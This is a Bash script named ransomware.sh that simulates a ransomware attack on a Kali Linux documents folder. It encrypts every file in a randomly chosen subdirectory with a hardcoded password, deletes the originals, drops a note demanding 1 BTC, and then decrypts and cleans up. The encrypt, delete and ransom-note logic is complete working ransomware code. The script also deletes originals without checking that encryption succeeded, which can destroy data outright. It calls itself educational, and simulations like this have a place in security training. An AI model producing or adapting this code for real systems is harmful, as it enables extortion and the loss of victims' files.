#!/bin/bash

# ransomware.sh - A simple ransomware script for educational purposes.
# This script performs the following operations:
# 1. Randomly selects a directory within a specified base directory.
# 2. Encrypts all files in the selected directory using a randomly chosen encryption tool.
# 3. Creates a ransom note in the selected directory.
# 4. Decrypts the files back to their original state and removes the ransom note.

# Variables:
# - BASE_DIR: The base directory containing subdirectories to be processed.
# - PASSWORD: The password used for encryption and decryption.
# - EXTENSIONS: A list of possible file extensions for encrypted files.
# - TOOLS: A list of possible encryption tools to use.

# Steps:
# 1. Check if the base directory exists. Exit if it does not.
# 2. Get a list of subdirectories within the base directory. Exit if no subdirectories are found.
# 3. Randomly select a subdirectory and an encryption tool/extension.
# 4. Encrypt each file in the selected directory using the chosen tool and extension.
# 5. Remove the original files after encryption.
# 6. Create a ransom note in the selected directory.
# 7. Decrypt the encrypted files back to their original state.
# 8. Remove the encrypted files and the ransom note after decryption.
# 9. Print status messages to indicate progress and completion.

# Note:
# - This script is for educational purposes only and should not be used for malicious activities.
# - Ensure that the required encryption tools (openssl, gpg, aescrypt) are installed on the system.

BASE_DIR="/home/kali/Documents"
PASSWORD="testpassword"  # Encryption password
EXTENSIONS=(".enc" ".locked" ".crypt")  # Possible extensions for encrypted files
TOOLS=("openssl" "gpg" "aescrypt")  # Possible encryption tools

# Ensure the base directory exists
if [ ! -d "$BASE_DIR" ]; then
    echo "Base directory $BASE_DIR does not exist. Exiting."
    exit 1
fi

# Get a list of directories within BASE_DIR and choose one at random
DIR_LIST=("$BASE_DIR"/*/)
if [ ${#DIR_LIST[@]} -eq 0 ]; then
    echo "No directories found in $BASE_DIR. Exiting."
    exit 1
fi

RANDOM_DIR="${DIR_LIST[RANDOM % ${#DIR_LIST[@]}]}"
RANDOM_DIR_NAME=$(basename "$RANDOM_DIR")

echo "Encrypting files in $RANDOM_DIR..."

# Randomly select an encryption tool and extension
TOOL=${TOOLS[$RANDOM % ${#TOOLS[@]}]}
EXTENSION=${EXTENSIONS[$RANDOM % ${#EXTENSIONS[@]}]}

# Encrypt each file in the selected directory
for file in "$RANDOM_DIR"*; do
    if [ -f "$file" ]; then
        case $TOOL in
            "openssl")
                openssl enc -aes-256-cbc -salt -in "$file" -out "${file}${EXTENSION}" -k "$PASSWORD"
                ;;
            "gpg")
                gpg --batch --passphrase "$PASSWORD" -c -o "${file}${EXTENSION}" "$file"
                ;;
            "aescrypt")
                aescrypt -e -p "$PASSWORD" -o "${file}${EXTENSION}" "$file"
                ;;
        esac
        rm "$file"  # Remove original file after encryption
    fi
done

# Create a ransom note inside the encrypted directory
RANSOM_NOTE="$RANDOM_DIR/ransom_note.txt"
echo "Files in '$RANDOM_DIR_NAME' have been encrypted. Send 1 BTC to unlock." > "$RANSOM_NOTE"

echo "Encryption complete. Ransom note placed in $RANDOM_DIR."

sleep 1

echo "Cleaning up and decrypting files in $RANDOM_DIR..."

# Decrypt each file back to its original form
for file in "$RANDOM_DIR"*"$EXTENSION"; do
    if [ -f "$file" ]; then
        original_file="${file%$EXTENSION}"  # Remove extension
        case $TOOL in
            "openssl")
                openssl enc -d -aes-256-cbc -salt -in "$file" -out "$original_file" -k "$PASSWORD"
                ;;
            "gpg")
                gpg --batch --passphrase "$PASSWORD" -d -o "$original_file" "$file"
                ;;
            "aescrypt")
                aescrypt -d -p "$PASSWORD" -o "$original_file" "$file"
                ;;
        esac
        rm "$file"  # Remove encrypted file after decryption
    fi
done

# Remove the ransom note
rm -f "$RANSOM_NOTE"

echo "Cleanup complete. Files in '$RANDOM_DIR_NAME' have been restored."
